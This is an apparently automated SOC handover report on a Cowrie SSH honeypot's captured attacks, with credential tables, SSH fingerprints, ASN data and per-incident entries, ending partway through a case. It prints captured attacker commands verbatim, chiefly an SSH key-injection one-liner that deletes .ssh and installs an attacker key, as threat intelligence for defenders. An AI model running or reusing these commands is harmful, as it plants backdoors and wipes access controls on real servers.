# 🛡 THIR · SOC Shift Handover Report

| Field | Value |
|---|---|
| **Report Date** | 2026-05-26 |
| **Generated At** | 2026-05-26T15:43:15Z |
| **Shift Time** | 15:43 UTC |
| **Honeypot Status** | ✅ HEALTHY |
| **Source** | Cowrie SSH Honeypot · AWS EC2 · Port 2222 |

---

## 📊 Executive Summary

| Metric | Value |
|---|---|
| Total Sessions Captured | **464** |
| Confirmed Threats | **448** |
| False Positives Filtered | **16** (3.5%) |
| Unique Attacker IPs | **64** |
| Countries of Origin | **20** |
| High Severity Cases | **141** |
| Medium Severity Cases | **0** |
| Low Severity Cases | **323** |
| Malware Samples Analyzed | **0** HIGH · **16** MED · 4 empty upload attempt(s) |

---

## 🔑 Credential Intelligence

| Metric | Value |
|---|---|
| Total Auth Attempts | **318** |
| Unique Credential Pairs | **139** |
| Unique Usernames | **68** |
| Unique Passwords | **125** |
| Successful Auth Pairs | **92** |

**Top Usernames:**

| Username | Attempts |
|---|---|
| `root` | 142 |
| `345gs5662d34` | 68 |
| `ubuntu` | 15 |
| `cloud` | 9 |
| `curl` | 9 |

**Top Passwords:**

| Password | Attempts |
|---|---|
| `3245gs5662d34` | 69 |
| `345gs5662d34` | 68 |
| `fjbdfdjkdsfs541544AA@@` | 19 |
| `fjbdfdjkdsfs541544@@` | 10 |
| `Wangsu@2017` | 9 |

**Top Credential Pairs:**

| Username | Password | Attempts |
|---|---|---|
| `root` | `3245gs5662d34` | 69 |
| `345gs5662d34` | `345gs5662d34` | 68 |
| `root` | `fjbdfdjkdsfs541544@@` | 10 |
| `root` | `fjbdfdjkdsfs541544AA@@` | 10 |
| `cloud` | `Wangsu@2017` | 9 |

**⚠️ Successful Auth Pairs (Priority — cross-reference with IR cases):**

| Username | Password | Source IP | Timestamp |
|---|---|---|---|
| `root` | `Qq112233` | `47.82.216.80` | 2026-05-26T08:28:22 |
| `root` | `3245gs5662d34` | `47.82.216.80` | 2026-05-26T08:28:25 |
| `root` | `Xs123456` | `183.222.230.188` | 2026-05-26T08:38:29 |
| `root` | `3245gs5662d34` | `183.222.230.188` | 2026-05-26T08:38:34 |
| `root` | `fjbdfdjkdsfs541544@@` | `183.222.230.188` | 2026-05-26T08:39:22 |
| `root` | `Aa1234567890.` | `183.222.230.188` | 2026-05-26T08:41:53 |
| `root` | `Admin@@123` | `183.222.230.188` | 2026-05-26T08:42:43 |
| `root` | `fjbdfdjkdsfs541544AA@@` | `183.222.230.188` | 2026-05-26T08:54:07 |
| `root` | `admin` | `116.110.6.117` | 2026-05-26T10:03:43 |
| `root` | `fjbdfdjkdsfs541544` | `179.33.210.213` | 2026-05-26T10:39:49 |
| `root` | `3245gs5662d34` | `179.33.210.213` | 2026-05-26T10:40:01 |
| `root` | `Aa666666` | `179.33.210.213` | 2026-05-26T10:41:07 |
| `root` | `server@2021` | `179.33.210.213` | 2026-05-26T10:43:28 |
| `root` | `fjbdfdjkdsfs541544AA@@` | `179.33.210.213` | 2026-05-26T10:44:37 |
| `root` | `fjbdfdjkdsfs541544@@` | `179.33.210.213` | 2026-05-26T10:50:01 |
| `root` | `root123!` | `179.33.210.213` | 2026-05-26T10:50:53 |
| `root` | `qaz123456` | `179.33.210.213` | 2026-05-26T10:51:46 |
| `root` | `a123456@` | `186.68.83.105` | 2026-05-26T11:08:48 |
| `root` | `3245gs5662d34` | `186.68.83.105` | 2026-05-26T11:08:54 |
| `root` | `fjbdfdjkdsfs541544@@` | `186.68.83.105` | 2026-05-26T11:09:37 |
| `root` | `Server1214!` | `186.68.83.105` | 2026-05-26T11:12:11 |
| `root` | `fjbdfdjkdsfs541544AA@@` | `186.68.83.105` | 2026-05-26T11:14:47 |
| `root` | `Hy123456` | `186.68.83.105` | 2026-05-26T11:15:37 |
| `root` | `Huawei@1234` | `186.68.83.105` | 2026-05-26T11:18:10 |
| `root` | `qwer123456!` | `186.68.83.105` | 2026-05-26T11:19:05 |
| `root` | `` | `176.65.139.99` | 2026-05-26T12:26:17 |
| `root` | `fjbdfdjkdsfs541544@@` | `118.39.234.65` | 2026-05-26T12:44:14 |
| `root` | `3245gs5662d34` | `118.39.234.65` | 2026-05-26T12:44:18 |
| `root` | `Qwer123` | `118.39.234.65` | 2026-05-26T12:44:58 |
| `root` | `fjbdfdjkdsfs541544AA@@` | `118.39.234.65` | 2026-05-26T12:46:28 |
| `root` | `1122` | `118.39.234.65` | 2026-05-26T12:47:14 |
| `root` | `Q!w2e3r4` | `118.39.234.65` | 2026-05-26T12:50:56 |
| `root` | `fjbdfdjkdsfs541544@@` | `197.248.8.33` | 2026-05-26T12:56:28 |
| `root` | `3245gs5662d34` | `197.248.8.33` | 2026-05-26T12:56:33 |
| `root` | `fjbdfdjkdsfs541544AA@@` | `187.33.251.218` | 2026-05-26T12:57:05 |
| `root` | `3245gs5662d34` | `187.33.251.218` | 2026-05-26T12:57:13 |
| `root` | `Bb112233` | `14.63.198.239` | 2026-05-26T13:02:58 |
| `root` | `3245gs5662d34` | `14.63.198.239` | 2026-05-26T13:03:02 |
| `root` | `aA112233..` | `186.31.95.163` | 2026-05-26T13:15:58 |
| `root` | `3245gs5662d34` | `186.31.95.163` | 2026-05-26T13:16:05 |
| `root` | `Asd123` | `172.211.56.214` | 2026-05-26T13:20:08 |
| `root` | `3245gs5662d34` | `172.211.56.214` | 2026-05-26T13:20:11 |
| `root` | `Qwerty@1234` | `120.48.80.70` | 2026-05-26T13:25:26 |
| `root` | `3245gs5662d34` | `120.48.80.70` | 2026-05-26T13:25:44 |
| `root` | `fjbdfdjkdsfs541544@@` | `120.48.80.70` | 2026-05-26T13:27:21 |
| `root` | `!qaz2wsx` | `120.48.80.70` | 2026-05-26T13:28:21 |
| `root` | `administrateur` | `120.48.80.70` | 2026-05-26T13:28:48 |
| `root` | `Li@123456` | `120.48.80.70` | 2026-05-26T13:29:43 |
| `root` | `1231` | `120.48.80.70` | 2026-05-26T13:30:12 |
| `root` | `fjbdfdjkdsfs541544AA@@` | `120.48.80.70` | 2026-05-26T13:31:37 |
| `root` | `octubre` | `118.145.238.60` | 2026-05-26T13:32:48 |
| `root` | `3245gs5662d34` | `118.145.238.60` | 2026-05-26T13:32:52 |
| `root` | `123qweasd@` | `118.145.238.60` | 2026-05-26T13:33:39 |
| `root` | `passwd@123!` | `118.145.238.60` | 2026-05-26T13:36:01 |
| `root` | `fjbdfdjkdsfs541544@@` | `118.145.238.60` | 2026-05-26T13:42:31 |
| `root` | `fjbdfdjkdsfs541544AA@@` | `118.145.238.60` | 2026-05-26T13:43:22 |
| `root` | `qwer1234.` | `34.142.110.144` | 2026-05-26T13:53:17 |
| `root` | `3245gs5662d34` | `34.142.110.144` | 2026-05-26T13:53:23 |
| `root` | `Wt123456` | `34.142.110.144` | 2026-05-26T13:53:52 |
| `root` | `mar` | `34.142.110.144` | 2026-05-26T13:54:25 |
| `root` | `admin2020` | `34.142.110.144` | 2026-05-26T13:54:57 |
| `root` | `Qwe123456.` | `34.142.110.144` | 2026-05-26T13:57:09 |
| `root` | `fjbdfdjkdsfs541544` | `34.142.110.144` | 2026-05-26T13:57:42 |
| `root` | `fjbdfdjkdsfs541544@@` | `34.142.110.144` | 2026-05-26T13:58:49 |
| `root` | `admin` | `125.132.34.65` | 2026-05-26T13:59:16 |
| `root` | `fjbdfdjkdsfs541544AA@@` | `34.142.110.144` | 2026-05-26T13:59:53 |
| `root` | `@a123456` | `101.96.211.139` | 2026-05-26T14:32:13 |
| `root` | `3245gs5662d34` | `101.96.211.139` | 2026-05-26T14:32:16 |
| `root` | `Root.123` | `117.159.39.226` | 2026-05-26T14:35:49 |
| `root` | `3245gs5662d34` | `117.159.39.226` | 2026-05-26T14:35:54 |
| `root` | `admin888` | `14.103.127.84` | 2026-05-26T14:41:48 |
| `root` | `3245gs5662d34` | `14.103.127.84` | 2026-05-26T14:41:52 |
| `root` | `Admin@123.` | `14.103.126.104` | 2026-05-26T14:46:39 |
| `root` | `3245gs5662d34` | `14.103.126.104` | 2026-05-26T14:46:45 |
| `root` | `fjbdfdjkdsfs541544@@` | `101.79.165.133` | 2026-05-26T14:48:28 |
| `root` | `3245gs5662d34` | `101.79.165.133` | 2026-05-26T14:48:31 |
| `root` | `!Q2w3e4r5t` | `14.103.126.104` | 2026-05-26T14:49:37 |
| `root` | `Qqq123456` | `180.76.98.88` | 2026-05-26T14:50:05 |
| `root` | `3245gs5662d34` | `180.76.98.88` | 2026-05-26T14:50:13 |
| `root` | `fjbdfdjkdsfs541544AA@@` | `14.103.126.104` | 2026-05-26T14:51:25 |
| `root` | `yusuf` | `14.103.126.104` | 2026-05-26T14:51:57 |
| `root` | `fjbdfdjkdsfs541544AA@@` | `101.79.165.133` | 2026-05-26T14:52:22 |
| `root` | `fjbdfdjkdsfs541544@@` | `14.103.126.104` | 2026-05-26T14:53:08 |
| `root` | `Abcd@1234` | `183.91.186.36` | 2026-05-26T14:55:20 |
| `root` | `3245gs5662d34` | `183.91.186.36` | 2026-05-26T14:55:23 |
| `root` | `chienbinh` | `101.79.165.133` | 2026-05-26T14:57:33 |
| `root` | `Abc123456..` | `101.79.165.133` | 2026-05-26T14:58:31 |
| `root` | `Yg12345678` | `101.79.165.133` | 2026-05-26T14:59:34 |
| `root` | `Abc654321` | `101.79.165.133` | 2026-05-26T15:02:40 |
| `root` | `Abcd!1234` | `101.79.165.133` | 2026-05-26T15:06:07 |
| `root` | `123!@#QWE` | `101.79.165.133` | 2026-05-26T15:08:17 |
| `root` | `123@Password` | `101.79.165.133` | 2026-05-26T15:10:30 |

---

## 🖥 SSH Fingerprint Intelligence

| Metric | Value |
|---|---|
| Total Sessions Parsed | **464** |
| Sessions with Fingerprint | **13** |
| Unique HASSH Fingerprints | **13** |

**Client Family Distribution:**

| Client Family | Sessions |
|---|---|
| libssh | 310 |
| Go SSH scanner | 30 |
| AsyncSSH (Python) | 8 |

**⚠️ Botnet/Scanner KEX Signatures Detected:**

| HASSH | Signature | Sessions | IPs |
|---|---|---|---|
| `f555226df196...` | Mirai/variant | 176 | 15 |
| `03a80b21afa8...` | Modern SSH client | 92 | 6 |
| `af8223ac9914...` | libssh-based | 41 | 4 |
| `fda360b1b4f4...` | Mirai/variant | 8 | 3 |
| `c39f4cec145e...` | Mirai/variant | 2 | 1 |

**Top Fingerprints:**

| HASSH | Client | Sessions | IPs | Botnet Sig |
|---|---|---|---|---|
| `f555226df196...` | libssh | 176 | 15 | Mirai/variant |
| `03a80b21afa8...` | libssh | 92 | 6 | Modern SSH client |
| `af8223ac9914...` | libssh | 41 | 4 | libssh-based |
| `95420f9d932d...` | Go SSH scanner | 21 | 4 | — |
| `fda360b1b4f4...` | AsyncSSH (Python) | 8 | 3 | Mirai/variant |
| `c39f4cec145e...` | Go SSH scanner | 2 | 1 | Mirai/variant |
| `bc3aee897af7...` | Go SSH scanner | 2 | 2 | Mirai/variant |
| `873a5fb5fedc...` | Go SSH scanner | 1 | 1 | Mirai/variant |

---

## ⚔️ Attack Campaign Intelligence

| Metric | Value |
|---|---|
| Total Command Clusters | **4** |
| Campaign Clusters | **3** |
| Highest Severity | **HIGH** |

**Active Campaigns:**

| Campaign | Severity | Sessions | IPs | TTPs |
|---|---|---|---|---|
| **Mirai/IoT Botnet** | 🔴 HIGH | 1 | 1 | `T1082, T1105, T1059.004` |
| **mdrfckr SSH Key Injection** | 🔴 HIGH | 68 | 20 | `T1021.004, T1078, T1070, T1140` |
| **mdrfckr SSH Key Injection** | 🔴 HIGH | 1 | 1 | `T1021.004, T1078, T1070, T1140` |

**🔴 HIGH · Mirai/IoT Botnet**

> Mirai-family IoT botnet. Executes busybox payloads for DDoS bot recruitment.

Representative commands:
```
echo SHELL_TEST
```
```
/bin/busybox TEST
```
```
cat /proc
```
```
./
```
Source IPs: `176.65.139.99`

**🔴 HIGH · mdrfckr SSH Key Injection**

> Backdoor SSH key injection campaign. Wipes existing authorized_keys and injects attacker public key.

Representative commands:
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
```
```
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~
```
Source IPs: `120.48.80.70`, `179.33.210.213`, `197.248.8.33`, `180.76.98.88`, `118.145.238.60`, `14.63.198.239`

**🔴 HIGH · mdrfckr SSH Key Injection**

> Backdoor SSH key injection campaign. Wipes existing authorized_keys and injects attacker public key.

Representative commands:
```
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~
```
Source IPs: `120.48.80.70`

---

## 🌐 ASN Cluster Intelligence

| Metric | Value |
|---|---|
| Total IPs Analysed | **64** |
| Unique ASNs | **42** |
| High-Risk ASNs | **34** |
| Anon Infrastructure ASNs | **0** |

**Top Attack ASNs:**

| ASN | Provider | IPs | Risk |
|---|---|---|---|
| `AS4134` | CHINANET BACKBONE | 5 | LOW |
| `AS8075` | Microsoft Corporation | 4 | HIGH |
| `AS45102` | Alibaba (US) Technology Co., Ltd. | 4 | HIGH |
| `AS38365` | Beijing Baidu Netcom Science and Technology Co., Ltd. | 3 | HIGH |
| `AS24086` | Viettel Corporation | 3 | HIGH |
| `AS4766` | Korea Telecom | 3 | HIGH |
| `AS135377` | UCLOUD INFORMATION TECHNOLOGY (HK) LIMITED | 2 | HIGH |
| `AS16509` | Amazon.com, Inc. | 2 | HIGH |

---

---

## 🚨 Priority Cases — Immediate Attention (141)

> Cases with auth success, command execution, or file downloads.
> Each requires individual review. Never grouped.

### 🔴 HIGH · IR-ed9371bfe2ab

| Field | Detail |
|---|---|
| **Source IP** | `47.82.216[.]80` |
| **First Seen** | 2026-05-26 08:28 |
| **Last Seen** | 2026-05-26 08:28 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-26 08:28:22` | `cowrie.session.connect` |
| `2026-05-26 08:28:22` | `cowrie.client.version` |
| `2026-05-26 08:28:22` | `cowrie.client.kex` |
| `2026-05-26 08:28:22` | `cowrie.login.success` |
| `2026-05-26 08:28:23` | `cowrie.session.params` |
| `2026-05-26 08:28:23` | `cowrie.command.input` |
| `2026-05-26 08:28:23` | `cowrie.command.failed` |
| `2026-05-26 08:28:23` | `cowrie.log.closed` |
| `2026-05-26 08:28:23` | `cowrie.session.params` |
| `2026-05-26 08:28:23` | `cowrie.command.input` |
| `2026-05-26 08:28:23` | `cowrie.session.file_download` |
| `2026-05-26 08:28:23` | `cowrie.log.closed` |
| `2026-05-26 08:28:25` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `47.82.216[.]80` to AbuseIPDB if not already reported
- [ ] Block `47.82.216[.]80` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-21a2a5fbd271

| Field | Detail |
|---|---|
| **Source IP** | `47.82.216[.]80` |
| **First Seen** | 2026-05-26 08:28 |
| **Last Seen** | 2026-05-26 08:28 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-26 08:28:24` | `cowrie.session.connect` |
| `2026-05-26 08:28:24` | `cowrie.client.version` |
| `2026-05-26 08:28:24` | `cowrie.client.kex` |
| `2026-05-26 08:28:25` | `cowrie.login.success` |
| `2026-05-26 08:28:25` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `47.82.216[.]80` to AbuseIPDB if not already reported
- [ ] Block `47.82.216[.]80` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d14bbd96ba40

| Field | Detail |
|---|---|
| **Source IP** | `183.222.230[.]188` |
| **First Seen** | 2026-05-26 08:38 |
| **Last Seen** | 2026-05-26 08:38 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-26 08:38:28` | `cowrie.session.connect` |
| `2026-05-26 08:38:28` | `cowrie.client.version` |
| `2026-05-26 08:38:28` | `cowrie.client.kex` |
| `2026-05-26 08:38:29` | `cowrie.login.success` |
| `2026-05-26 08:38:30` | `cowrie.session.params` |
| `2026-05-26 08:38:30` | `cowrie.command.input` |
| `2026-05-26 08:38:30` | `cowrie.command.failed` |
| `2026-05-26 08:38:30` | `cowrie.log.closed` |
| `2026-05-26 08:38:30` | `cowrie.session.params` |
| `2026-05-26 08:38:30` | `cowrie.command.input` |
| `2026-05-26 08:38:31` | `cowrie.session.file_download` |
| `2026-05-26 08:38:31` | `cowrie.log.closed` |
| `2026-05-26 08:38:34` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `183.222.230[.]188` to AbuseIPDB if not already reported
- [ ] Block `183.222.230[.]188` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-aaf98fd940f1

| Field | Detail |
|---|---|
| **Source IP** | `183.222.230[.]188` |
| **First Seen** | 2026-05-26 08:38 |
| **Last Seen** | 2026-05-26 08:38 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-26 08:38:33` | `cowrie.session.connect` |
| `2026-05-26 08:38:33` | `cowrie.client.version` |
| `2026-05-26 08:38:33` | `cowrie.client.kex` |
| `2026-05-26 08:38:34` | `cowrie.login.success` |
| `2026-05-26 08:38:34` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `183.222.230[.]188` to AbuseIPDB if not already reported
- [ ] Block `183.222.230[.]188` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2652636c86d7

| Field | Detail |
|---|---|
| **Source IP** | `183.222.230[.]188` |
| **First Seen** | 2026-05-26 08:39 |
| **Last Seen** | 2026-05-26 08:39 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-26 08:39:21` | `cowrie.session.connect` |
| `2026-05-26 08:39:21` | `cowrie.client.version` |
| `2026-05-26 08:39:22` | `cowrie.client.kex` |
| `2026-05-26 08:39:22` | `cowrie.login.success` |
| `2026-05-26 08:39:23` | `cowrie.session.params` |
| `2026-05-26 08:39:23` | `cowrie.command.input` |
| `2026-05-26 08:39:23` | `cowrie.command.failed` |
| `2026-05-26 08:39:23` | `cowrie.log.closed` |
| `2026-05-26 08:39:23` | `cowrie.session.params` |
| `2026-05-26 08:39:23` | `cowrie.command.input` |
| `2026-05-26 08:39:23` | `cowrie.session.file_download` |
| `2026-05-26 08:39:23` | `cowrie.log.closed` |
| `2026-05-26 08:39:27` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `183.222.230[.]188` to AbuseIPDB if not already reported
- [ ] Block `183.222.230[.]188` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f9a2288da017

| Field | Detail |
|---|---|
| **Source IP** | `183.222.230[.]188` |
| **First Seen** | 2026-05-26 08:39 |
| **Last Seen** | 2026-05-26 08:39 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-26 08:39:26` | `cowrie.session.connect` |
| `2026-05-26 08:39:26` | `cowrie.client.version` |
| `2026-05-26 08:39:26` | `cowrie.client.kex` |
| `2026-05-26 08:39:27` | `cowrie.login.success` |
| `2026-05-26 08:39:27` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `183.222.230[.]188` to AbuseIPDB if not already reported
- [ ] Block `183.222.230[.]188` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-99205f000168

| Field | Detail |
|---|---|
| **Source IP** | `183.222.230[.]188` |
| **First Seen** | 2026-05-26 08:41 |
| **Last Seen** | 2026-05-26 08:41 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-26 08:41:52` | `cowrie.session.connect` |
| `2026-05-26 08:41:52` | `cowrie.client.version` |
| `2026-05-26 08:41:52` | `cowrie.client.kex` |
| `2026-05-26 08:41:53` | `cowrie.login.success` |
| `2026-05-26 08:41:54` | `cowrie.session.params` |
| `2026-05-26 08:41:54` | `cowrie.command.input` |
| `2026-05-26 08:41:54` | `cowrie.command.failed` |
| `2026-05-26 08:41:54` | `cowrie.log.closed` |
| `2026-05-26 08:41:54` | `cowrie.session.params` |
| `2026-05-26 08:41:54` | `cowrie.command.input` |
| `2026-05-26 08:41:54` | `cowrie.session.file_download` |
| `2026-05-26 08:41:54` | `cowrie.log.closed` |
| `2026-05-26 08:41:58` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `183.222.230[.]188` to AbuseIPDB if not already reported
- [ ] Block `183.222.230[.]188` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-05422aa8f10f

| Field | Detail |
|---|---|
| **Source IP** | `183.222.230[.]188` |
| **First Seen** | 2026-05-26 08:41 |
| **Last Seen** | 2026-05-26 08:41 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-26 08:41:57` | `cowrie.session.connect` |
| `2026-05-26 08:41:57` | `cowrie.client.version` |
| `2026-05-26 08:41:57` | `cowrie.client.kex` |
| `2026-05-26 08:41:58` | `cowrie.login.success` |
| `2026-05-26 08:41:58` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `183.222.230[.]188` to AbuseIPDB if not already reported
- [ ] Block `183.222.230[.]188` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f31e920d09a5

| Field | Detail |
|---|---|
| **Source IP** | `183.222.230[.]188` |
| **First Seen** | 2026-05-26 08:42 |
| **Last Seen** | 2026-05-26 08:42 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
